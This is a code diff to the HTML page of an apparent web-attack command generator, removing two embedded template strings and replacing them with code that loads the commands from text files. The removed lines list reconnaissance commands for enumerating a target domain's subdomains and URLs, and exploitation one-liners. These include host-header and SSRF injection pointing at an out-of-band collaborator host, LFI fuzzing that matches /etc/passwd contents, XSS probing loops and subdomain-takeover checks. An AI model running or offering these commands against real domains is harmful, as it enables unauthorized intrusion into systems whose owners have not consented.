@@ -81,7 +81,7 @@
         <label for="target" class="form-label">Target Domain</label>
         <input type="text" class="form-control mb-2" id="target" placeholder="e.g. nasa.gov" />
         <button class="btn btn-primary mb-2" onclick="generateCommands('recon')">Generate</button>
-        <div id="output-recon" class="output-box mb-2"></div>
+        <pre id="output-recon" class="output-box mb-2"></pre>
         <button class="btn btn-success" onclick="copyToClipboard('recon')">Copy</button>
       </div>
 
@@ -99,9 +99,9 @@
           Commands</button>
 
         <label class="form-label">Generated Exploitation Commands</label>
-        <div id="output-exploit" class="output-box mb-2"
+        <pre id="output-exploit" class="output-box mb-2"
           style="height: 300px; overflow-y: scroll; background: #000; color: #f00; border: 1px solid #f00; padding: 12px; font-family: monospace; white-space: pre-wrap;">
-        </div>
+        </pre>
 
         <button class="btn btn-warning" onclick="copyToClipboard('exploit')">Copy Exploitation Commands</button>
       </div>
@@ -112,43 +112,25 @@
 
 
   <script>
-    const baseReconCommands = `
-# [----- (aceos@MIKE) - [~hacking-commands]
-$ subfinder -d {{TARGET}} -all -recursive | tee subfinder.txt
-$ shodanx subdomain -d {{TARGET}} -o shodanx.txt
-$ assetfinder --subs-only {{TARGET}} | grep "\.{{TARGET}}" | tee -a assertfinder.txt
-$ amass enum -active -norecursive -d {{TARGET}} | grep "\.{{TARGET}}" | awk '{print $1}' | tee amass.txt
-$ gobuster dns -d {{TARGET}} -w /mnt/d/Downloads/Documents/subdomain_megalist.txt | awk '{print $2}' | tee gobuster.txt
-$ cat subfinder.txt amass.txt shodanx.txt assertfinder.txt gobuster.txt | sort -u | grep '\.{{TARGET}}'| tee -a subs_{{TARGET}}.txt
-$ curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/{{TARGET}}/passive_dns" | jq -r '.passive_dns[]?.hostname' | sort -u | tee -a alienvault_subs.txt
-$ curl -s "https://urlscan.io/api/v1/search/?q=domain:{{TARGET}}&size=10000" | jq -r '.results[]?.page?.domain' | sort -u | tee urlscan_subs.txt
-$ cat subs_{{TARGET}}.txt alienvault_subs.txt urlscan_subs.txt subfinder.txt | sort -u | tee all_subs_{{TARGET}}.txt
-$ httpx -l all_subs_{{TARGET}}.txt -td -title -sc -ip -threads 200 -o httpx_{{TARGET}}.txt
-$ cat httpx_{{TARGET}}.txt | grep -Ei 'old|asp|php|jsp|jspx|aspx' | tee subs-commonly-wth-vulns.txt
-$ cat httpx_{{TARGET}}.txt | awk '{print $1}' | tee hosts_alive.txt
-$ cat hosts_alive.txt | grep -E "admin|panel|portal|secure|dashboard|internal|api" | tee important_subdomains.txt
-$ waymore -i {{TARGET}} -mode U -oU waymore.txt
-$ cat hosts_alive.txt | gau | tee gaurls.txt
-$ cat hosts_alive.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o gauplus.txt
-$ cat hosts_alive.txt | katana -d 5 | tee katana.txt
-$ cat gauplus.txt gaurls.txt katana.txt | anew all{{TARGET}}urls.txt
-$ cat all{{TARGET}}urls.txt | gf base64 >> tee base64.txt
-$ cat all{{TARGET}}urls.txt | grep -E "redirect=|url=|next=|return=" | tee open_redirect_params.txt
-$ cat all{{TARGET}}urls.txt | grep -oE '(/|https?://)[^"]+\.js' | anew jsfiles.txt
-$ nuclei -l hosts_alive.txt -t ~/nuclei-templates/ -severity critical,high,medium,low | tee nuclei.txt
-$ nuclei -t ~/nuclei-templates/cves/ -list hosts_alive.txt | tee cves.txt
-    `.trim();
+ function loadCommands(file, elementId) {
+    fetch(file)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`Failed to load ${file}`);
+        }
+        return response.text();
+      })
+      .then(data => {
+        document.getElementById(elementId).textContent = data;
+      })
+      .catch(error => {
+        document.getElementById(elementId).textContent = `Error loading ${file}: ${error}`;
+      });
+  }
 
-    const baseExploitationCommands = `
-$ subzy run --targets hosts_alive.txt --concurrency 100 --hide_fails --verify_ssl
-$ cat hosts_alive.txt | xargs -I % sh -c 'echo "Scanning: %" && curl -I % -H "Host: {{COLLAB}}" -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"'
-$ cat hosts_alive.txt | xargs -I % curl -I % -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"    
-$ cat all{{TARGET}}urls.txt | grep "=" | qsreplace {{COLLAB}} | httpx
-$ cat all{{TARGET}}urls.txt | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /mnt/d/Desktop/lostsec-payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
-$ python ~/Corsy/corsy.py -i hosts_alive.txt -o corsy_results.txt 
-$ cat hosts_alive.txt | while read url; do echo -e "\033[1;32m$url\033[0m"; xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: {{COLLAB}}' | grep xss); xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host: {{COLLAB}}' | grep xss); xss3=$(curl -s -L "$url" -H 'Host: {{COLLAB}}' | grep xss); xss4=$(curl -s -L "$url" --request-target http://{{COLLAB}}/ --max-time 2); echo "Method[1] X-Forwarded-For: xss+ssrf => $xss1"; echo "Method[2] X-Forwarded-Host: xss+ssrf => $xss2"; echo "Method[3] Host: xss+ssrf => $xss3"; echo "Method[4] GET request-target => $xss4"; done
-$ sif -d {{TARGET}}
-    `.trim();
+  // Load both files
+  loadCommands('recon_commands.txt', 'recon-commands');
+  loadCommands('exploit_commands.txt', 'exploit-commands');
 
 
 
